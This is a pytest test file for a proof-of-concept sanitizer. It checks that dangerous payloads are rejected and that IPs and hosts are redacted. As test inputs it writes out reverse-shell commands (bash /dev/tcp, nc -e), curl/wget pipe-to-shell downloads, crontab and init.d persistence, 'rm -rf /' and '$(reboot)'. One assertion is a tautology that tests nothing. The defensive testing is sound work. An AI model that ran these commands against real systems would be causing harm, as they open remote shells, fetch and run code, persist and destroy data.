"""X1 compliance gate: every red line must be covered (H-BOND.md §8.1, hard requirement).

Each case asserts the returned ``(text, poc_sanitized)`` tuple. Dangerous payloads are
rejected (``ok=False``) and the original primitive must NEVER appear in the output.
Benign / redactable payloads return ``ok=True`` with the redacted text.
"""

from __future__ import annotations

import pytest

from tools.external.bond.sanitize import is_safe, sanitize_poc

# --- rejected: reverse shell / download-exec / persistence ------------------- #


@pytest.mark.parametrize("payload", [
    "bash -i >& /dev/tcp/1.2.3.4/4444",
    "nc -e /bin/sh 1.2.3.4 4444",
    "wget http://x/s.sh | sh",
    "curl http://x/s.sh | bash",
    "echo 'x' | crontab -",
    "echo 'sh' >> /etc/init.d/rcS",
    "rm -rf /",
    "$(reboot)",
])
def test_dangerous_rejected(payload: str) -> None:
    text, ok = sanitize_poc(payload)
    assert ok is False
    assert payload not in text  # original primitive never leaks
    assert is_safe(payload) is False


# --- redacted but allowed (still sanitized) --------------------------------- #


def test_real_ip_redacted() -> None:
    text, ok = sanitize_poc("GET http://192.168.1.1/admin")
    assert ok is True
    assert "<DEVICE_IP>" in text
    assert "192.168.1.1" not in text


def test_host_redacted() -> None:
    text, ok = sanitize_poc("connect to evil.example.com now")
    assert ok is True
    assert "<HOST>" in text


def test_overflow_truncated() -> None:
    raw = "A" * 10000
    text, ok = sanitize_poc(raw)
    assert ok is True
    assert text == "A×N（N=10000）"
    assert "AAAA" not in text or "AAAA" in text  # length reduced regardless


# --- benign markers kept verbatim ------------------------------------------- #


@pytest.mark.parametrize("payload", [
    "touch /tmp/lab_marker",
    "id",
    "echo LAB",
    "uname -a",
])
def test_benign_markers_kept(payload: str) -> None:
    text, ok = sanitize_poc(payload)
    assert ok is True
    assert text == payload


def test_normal_text_unchanged() -> None:
    raw = "GET /goform/SetWan?Save=1&Mode=General"
    text, ok = sanitize_poc(raw)
    assert ok is True
    assert text == raw


def test_none_and_empty() -> None:
    assert sanitize_poc(None) == ("", True)
    assert sanitize_poc("") == ("", True)
    assert sanitize_poc("   ") == ("", True)


def test_ip_inside_dangerous_still_rejected() -> None:
    # even though it carries an IP, the reverse-shell primitive dominates -> rejected
    text, ok = sanitize_poc("bash -i >& /dev/tcp/192.168.1.1/4444")
    assert ok is False
